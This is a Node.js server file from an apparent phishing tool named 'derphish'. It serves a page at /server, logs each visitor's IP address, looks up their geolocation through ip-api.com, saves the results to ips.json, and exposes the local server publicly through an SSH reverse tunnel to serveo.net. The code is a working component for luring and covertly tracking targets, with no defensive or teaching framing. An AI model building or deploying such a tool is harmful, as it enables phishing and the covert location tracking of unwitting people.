const express = require('express');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');
const http = require('http');
const colors = require('colors');
const app = express();
const figlet = require('figlet');
const port = "8080";
const banner = "derphish";
const EventEmitter = require('events');

const emitter = new EventEmitter();
//const wer = require('../index.js');

app.get("/server", (req, res) => {
  const userIp = req.headers['x-forwarded-for'] || req.ip;
  console.log('[!] UserIP => ', userIp);

  http.get(`http://ip-api.com/json/${userIp}`, (resp) => {
    let data = '';

    resp.on('data', (chunk) => {
      data += chunk;
    });

    resp.on('end', () => {
      try {
        const parsedData = JSON.parse(data);
        const formattedData = JSON.stringify(parsedData, null, 2);

        fs.writeFile('./ips.json', formattedData, (err) => {
          if (err) {
            console.error('Erro to save:', err);
          } else {
            console.log('Saved!'.magenta.bold);
          }
        });

        console.log(formattedData);
      } catch (e) {
        console.error('Erro API:', e);
      }
    });
  });

  res.sendFile(__dirname + '/server/index.html');
});



function serverUp() {
  const sshProcess = spawn('ssh', ['-R', '80:localhost:8080', 'serveo.net']);

  sshProcess.stdout.on('data', (data) => {
    const output = data.toString();
    console.log('Exit  SSH:', output);

    const match = output.match(/https:\/\/.*\.serveo\.net/);
    if (match) {
      const link = match[0];
      console.log('🔗 URL:', link.magenta.bold);
      emitter.emit('link-pronto', link);
    }
  });

  sshProcess.on('close', (code) => {
    console.log(`SSH closed with code ${code}`);
  });
}

app.listen(port, () => {

figlet.text(banner, {font: 'Small'}, (err, data) => {
if (err){
console.log(err);
}
console.log(data);
console.log('server running => '.magenta.bold, `http://localhost:${port}`.green.bold);
serverUp();
})
})


module.exports = {
  serverUp,
  emitter
};
